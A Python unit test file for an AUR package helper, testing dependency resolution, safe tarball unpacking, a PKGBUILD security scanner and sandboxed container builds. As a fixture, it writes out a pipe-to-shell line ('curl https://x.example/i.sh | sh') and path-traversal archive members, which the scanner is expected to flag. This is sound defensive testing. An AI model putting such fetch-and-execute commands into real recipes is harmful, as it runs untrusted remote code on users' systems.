import io
import json
import os
import sys
import tarfile
import tempfile
import unittest
import urllib.parse
from types import SimpleNamespace

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "python"))

sys.path.insert(0, os.path.dirname(__file__))
import lang  # noqa: E402,F401  tests run in English

from ozipkg import aur, cli  # noqa: E402

NOW = 1_800_000_000
OLD = NOW - 400 * 86400


def record(name, depends=(), makedepends=(), votes=50, maintainer="someone", first=OLD):
    return {"Name": name, "PackageBase": name, "Version": "1.0-1", "Depends": list(depends),
            "MakeDepends": list(makedepends), "NumVotes": votes, "Maintainer": maintainer, "FirstSubmitted": first}


def snapshot(base, pkgbuild, extra=None):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name, text in {"PKGBUILD": pkgbuild, **(extra or {})}.items():
            data = text.encode()
            member = tarfile.TarInfo("%s/%s" % (base, name))
            member.size = len(data)
            tar.addfile(member, io.BytesIO(data))
    return buf.getvalue()


GOOD = "pkgname=demo\nsource=('https://example.org/demo-1.0.tar.gz')\nsha256sums=('abc')\nbuild() { make; }\n"


class FakeAur:
    def __init__(self, records, recipes=None):
        self.records = {r["Name"]: r for r in records}
        self.recipes = recipes or {}
        self.urls = []

    def __call__(self, url, limit=None):
        self.urls.append(url)
        if "/rpc/" in url:
            names = [urllib.parse.unquote(p[6:]) for p in url.split("?", 1)[1].split("&") if p.startswith("arg[]=")]
            return json.dumps({"type": "multiinfo", "results": [self.records[n] for n in names if n in self.records]}).encode()
        base = url.rsplit("/", 1)[1].removesuffix(".tar.gz")
        return self.recipes.get(base) or snapshot(base, GOOD)


class Resolve(unittest.TestCase):
    def test_dependencies_come_first(self):
        fake = FakeAur([record("app", depends=["libfoo>=2", "glibc"]), record("libfoo", makedepends=["libbar"]), record("libbar")])
        order = aur.resolve(["app"], fake, in_repo=lambda n: n == "glibc")
        self.assertEqual([r["Name"] for r in order], ["libbar", "libfoo", "app"])

    def test_repo_packages_are_skipped(self):
        fake = FakeAur([record("app")])
        self.assertEqual(aur.resolve(["vlc"], fake, in_repo=lambda n: True), [])

    def test_cycle_is_an_error(self):
        fake = FakeAur([record("a", depends=["b"]), record("b", depends=["a"])])
        with self.assertRaises(aur.AurError):
            aur.resolve(["a"], fake)

    def test_unknown_package(self):
        with self.assertRaises(aur.AurError):
            aur.resolve(["ghost"], FakeAur([]))

    def test_names_are_validated_before_any_request(self):
        fake = FakeAur([])
        with self.assertRaises(aur.AurError):
            aur.info(["a&arg[]=b"], fake)
        self.assertEqual(fake.urls, [])


def _only_readme():
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        member = tarfile.TarInfo("x/README")
        member.size = 1
        tar.addfile(member, io.BytesIO(b"x"))
    return buf.getvalue()


class Recipe(unittest.TestCase):
    def test_reads_files_and_skips_odd_members(self):
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tar:
            for name in ("demo/PKGBUILD", "demo/demo.install", "demo/../evil", "demo/sub/x", "/abs"):
                member = tarfile.TarInfo(name)
                member.size = 1
                tar.addfile(member, io.BytesIO(b"x"))
        files = aur.read_snapshot(buf.getvalue(), "demo")
        self.assertEqual(sorted(files), ["PKGBUILD", "demo.install"])

    def test_missing_pkgbuild(self):
        with self.assertRaises(aur.AurError):
            aur.read_snapshot(_only_readme(), "x")

    def test_clean_recipe_has_no_findings(self):
        self.assertEqual(aur.review_recipe({"PKGBUILD": GOOD}, record("demo"), NOW), [])

    def test_pipe_to_shell_is_danger(self):
        findings = aur.review_recipe({"PKGBUILD": GOOD + "package() { curl https://x.example/i.sh | sh; }\n"}, None, NOW)
        self.assertEqual(findings[0].severity, "danger")

    def test_install_file_is_scanned(self):
        findings = aur.review_recipe({"PKGBUILD": GOOD, "demo.install": "post_install() { systemctl enable demo; }\n"}, None, NOW)
        self.assertTrue(any(f.where == "demo.install" for f in findings))

    def test_plain_http_and_bare_ip_sources(self):
        text = "source=('http://example.org/a.tar.gz' 'https://10.0.0.5/b.tar.gz')\nsha256sums=('a' 'b')\n"
        ids = {f.rule for f in aur.scan_pkgbuild(text)}
        self.assertEqual(ids, {"plain-source", "ip-source"})

    def test_skipped_checksum_is_a_notice_but_not_for_git(self):
        self.assertEqual([f.rule for f in aur.scan_pkgbuild("source=('https://e.org/a.tgz')\nsha256sums=('SKIP')\n")], ["no-checksum"])
        self.assertEqual(aur.scan_pkgbuild("source=('git+https://e.org/a.git')\nsha256sums=('SKIP')\n"), [])

    def test_metadata_findings(self):
        findings = aur.review_recipe({"PKGBUILD": GOOD}, record("googel-chrome", votes=0, maintainer=None, first=NOW - 86400), NOW)
        self.assertEqual({f.rule for f in findings}, {"lookalike", "new-package", "orphaned", "few-votes"})


class Build(unittest.TestCase):
    def test_container_sees_only_the_build_folder(self):
        cmd = aur.build_command("/tmp/b", driver="vfs")
        self.assertIn("/tmp/b:/build", cmd)
        self.assertEqual(sum(1 for c in cmd if c == "-v"), 1)
        self.assertEqual(cmd[cmd.index("--cap-drop") + 1], "all")
        self.assertIn("no-new-privileges", cmd)
        self.assertNotIn("pacman -U", cmd[-1])

    def test_earlier_packages_are_mounted_read_only_and_installed(self):
        cmd = aur.build_command("/tmp/b", "/tmp/deps", driver="vfs")
        self.assertIn("/tmp/deps:/deps:ro", cmd)
        self.assertIn("pacman -U --noconfirm --needed /deps/", cmd[-1])

    def test_script_never_runs_makepkg_as_root(self):
        self.assertIn("su builder -c", aur.build_script(False))


class InstallAur(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.lines, self.calls, self.helper = [], [], []

    def tearDown(self):
        self.tmp.cleanup()

    def runner(self, cmd, **kwargs):
        self.calls.append(cmd)
        build_dir = next(c[:-len(":/build")] for c in cmd if c.endswith(":/build"))
        name = os.path.basename(build_dir)
        with open(os.path.join(build_dir, "%s-1.0-1-x86_64.pkg.tar.zst" % name), "wb") as fh:
            fh.write(name.encode())
        return SimpleNamespace(returncode=0)

    def caller(self, verb, args, out=print):
        self.helper.append((verb, os.path.basename(args[0]), len(args[1])))
        return 0

    def install(self, fake, names, **kwargs):
        return cli.install_aur(names, out=self.lines.append, yes=True, fetch=fake, runner=kwargs.pop("runner", self.runner),
                               caller=self.caller, in_repo=lambda n: False, workdir=os.path.join(self.tmp.name, "w"),
                               now=NOW, driver="vfs", **kwargs)

    def test_builds_dependencies_first_and_installs_each(self):
        fake = FakeAur([record("app", depends=["lib"]), record("lib")])
        done = self.install(fake, ["app"])
        self.assertEqual(done, ["lib-1.0-1-x86_64.pkg.tar.zst", "app-1.0-1-x86_64.pkg.tar.zst"])
        self.assertEqual([h[0] for h in self.helper], ["install-file", "install-file"])
        self.assertTrue(all(h[2] == 64 for h in self.helper))
        self.assertNotIn("/deps:ro", " ".join(self.calls[0]))      # nothing built yet
        self.assertIn("/deps:ro", " ".join(self.calls[1]))         # lib is available to app

    def test_dangerous_recipe_needs_force(self):
        bad = snapshot("app", GOOD + "package() { curl https://x.example/i.sh | sh; }\n")
        fake = FakeAur([record("app")], {"app": bad})
        with self.assertRaises(cli.CliError):
            self.install(fake, ["app"])
        self.assertEqual(self.calls, [])
        self.assertEqual(self.install(fake, ["app"], force=True), ["app-1.0-1-x86_64.pkg.tar.zst"])

    def test_failed_build_installs_nothing(self):
        fake = FakeAur([record("app")])
        with self.assertRaises(cli.CliError):
            self.install(fake, ["app"], runner=lambda cmd, **k: SimpleNamespace(returncode=2))
        self.assertEqual(self.helper, [])

    def test_helper_failure_stops_the_run(self):
        fake = FakeAur([record("app", depends=["lib"]), record("lib")])
        self.caller = lambda verb, args, out=print: 1
        with self.assertRaises(cli.CliError):
            self.install(fake, ["app"])
        self.assertEqual(len(self.calls), 1)


if __name__ == "__main__":
    unittest.main()
